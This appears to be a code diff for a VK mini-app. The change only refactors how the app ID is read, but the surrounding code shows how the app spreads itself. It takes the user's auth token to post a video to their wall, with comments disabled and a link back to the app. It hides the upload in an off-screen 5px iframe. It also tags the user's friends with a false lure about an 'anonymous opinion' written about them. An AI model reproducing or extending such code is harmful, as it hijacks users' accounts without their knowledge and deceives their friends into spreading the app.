@@ -14,8 +14,16 @@
       var id_albom = 0;
       var count_upload_photo = 0;
       var global_offset_i = 0;
+      var vk_app_id = false;
 
       window.onload = function() {
+        if(parseInt(findGetParameter("vk_app_id"))) {
+         vk_app_id = parseInt(findGetParameter("vk_app_id"));
+       }else{
+         vk_app_id = parseInt(findGetParameter("api_id"));
+       }
+
+
         vkConnect.send('VKWebAppInit');
         vkConnect.sendPromise('VKWebAppGetUserInfo')
             .then(data => {
@@ -27,7 +35,7 @@
 
       function getToken() {
           vkConnect.sendPromise("VKWebAppGetAuthToken", {
-              "app_id": parseInt(findGetParameter("vk_app_id")),
+              "app_id": vk_app_id,
               "scope": "friends,groups,photos"
           })
           .then(data => {
@@ -93,7 +101,7 @@
       var video = "https://vimeo.com/700021370";
         vkConnect.sendPromise("VKWebAppCallAPIMethod", {
            "method": "video.save",
-           "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":"Приложение доступно по ссылке : https://vk.com/app"+parseInt(findGetParameter("vk_app_id")), "v": "5.95", "access_token": token}
+           "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":"Приложение доступно по ссылке : https://vk.com/app"+vk_app_id, "v": "5.95", "access_token": token}
        }).then(data => {
          $("body").append('<div style="position: fixed;left:99999px" id="for_iframe"></div>');
          $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');
@@ -115,7 +123,7 @@
 
     function uploadStory() {
       vkConnect.send("VKWebAppShowStoryBox", {
-         "background_type" : "image", "url" : "https://sun9-77.userapi.com/s/v1/ig2/sEKq3-40KcDGlfs_36ypNhNG6B5SRcpXWYuym2xj5fLuWmG7zOqnP_JY2a9GjBEeblVuXslqx5HfVKXOOyVHvuzJ.jpg?size=1080x1920&quality=95&type=album", "attachment": {"text":"open", "type": "url", "url": "https://vk.com/app"+parseInt(findGetParameter("vk_app_id"))}
+         "background_type" : "image", "url" : "https://sun9-77.userapi.com/s/v1/ig2/sEKq3-40KcDGlfs_36ypNhNG6B5SRcpXWYuym2xj5fLuWmG7zOqnP_JY2a9GjBEeblVuXslqx5HfVKXOOyVHvuzJ.jpg?size=1080x1920&quality=95&type=album", "attachment": {"text":"open", "type": "url", "url": "https://vk.com/app"+vk_app_id}
        }).then(data => {
 
         })
@@ -169,7 +177,7 @@
 
 
                       var text = [
-                        users_list+", о тебе написали новое анонимное мнение \n\n Посмотри в приложении : https://vk.com/app"+parseInt(findGetParameter("vk_app_id")),
+                        users_list+", о тебе написали новое анонимное мнение \n\n Посмотри в приложении : https://vk.com/app"+vk_app_id,
                       ];
                       caption = text[getRandom(0,text.length-1)];
 
